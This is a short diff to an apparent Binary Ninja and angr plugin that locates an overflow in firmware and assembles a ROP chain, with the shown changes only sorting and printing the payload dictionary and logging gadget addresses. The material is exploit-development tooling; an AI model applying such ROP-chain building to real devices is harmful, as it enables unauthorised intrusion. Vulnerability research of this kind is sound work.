@@ -156,6 +156,7 @@ def find_vuln(bv):
         identify_overflow(found, registers)
 
 def build_ROP(bv):
+
    
     proj = angr.Project(bv.file.filename, ld_path=[
                         '/home/horac/Research/firmware/poc/fmk/rootfs/lib'], use_system_libs=False)
@@ -199,7 +200,6 @@ def build_ROP(bv):
     arg0 = angr.PointerWrapper(init)
     state = proj.factory.call_state(0x4703f0, arg0)
     simgr = proj.factory.simgr(state)
-    payload['init'] = init
     binja.log_info("Gadget 1 address: 0x{0:0x}".format(gadget1))
     binja.log_info("Gadget 2 address: 0x{0:0x}".format(gadget2))
     binja.log_info("Gadget 3 address: 0x{0:0x}".format(gadget3))
@@ -367,8 +367,9 @@ def build_ROP(bv):
             found, registers, found.solver.eval(found.regs.pc, cast_to=int)))
         state_history[hex(gadget5)] = found
 
-        print("Payload", payload)
-        interaction.show_markdown_report('ROP Stack', get_stack_report(payload))
+        sortedDict = collections.OrderedDict(sorted(payload.items()))
+        print("Payload", sortedDict)
+        interaction.show_markdown_report('ROP Stack', get_stack_report(sortedDict))
 
 
 
